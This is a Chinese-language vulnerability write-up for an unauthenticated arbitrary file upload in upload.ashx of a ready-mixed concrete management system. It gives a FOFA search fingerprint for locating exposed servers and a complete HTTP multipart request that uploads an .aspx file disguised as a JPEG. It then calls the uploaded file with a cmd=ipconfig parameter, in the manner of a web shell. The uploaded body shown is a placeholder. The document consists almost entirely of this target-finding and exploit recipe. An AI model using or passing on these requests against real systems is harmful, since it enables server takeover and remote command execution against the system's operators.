# 预拌砼综合管理系统upload.ashx存在任意文件上传

# 一、漏洞简介
预拌砼综合管理系统存在未授权文件上传漏洞，可以获取服务权限


# 二、资产测绘
+ fofa
```
body="Libs/Platform.lib"
```

# 三、漏洞复现
```
POST /WebUpload/server/upload.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Content-Type: multipart/form-data; boundary=----geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Length: 253885

------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="OwnBaseFolder"

GpAgreeFile/2026-01-29
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="id"

WU_FILE_0
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="name"

wenxue.aspx
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="type"

image/jpeg
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="lastModifiedDate"

2026/1/29 13:22:14
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="size"

82762
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="file"; filename="wenxue.aspx"
Content-Type: image/jpeg

11111
------geckoformboundary8a2afaa88de91add9545aab5a13188a2--
```
# 访问地址
```
GET /WebUpload/Upload/GpAgreeFile/2026-01-29/Others/75cf5209-d0cd-4305-b9f2-88c0b4b744d0.aspx?cmd=ipconfig HTTP/1.1
Host:
```
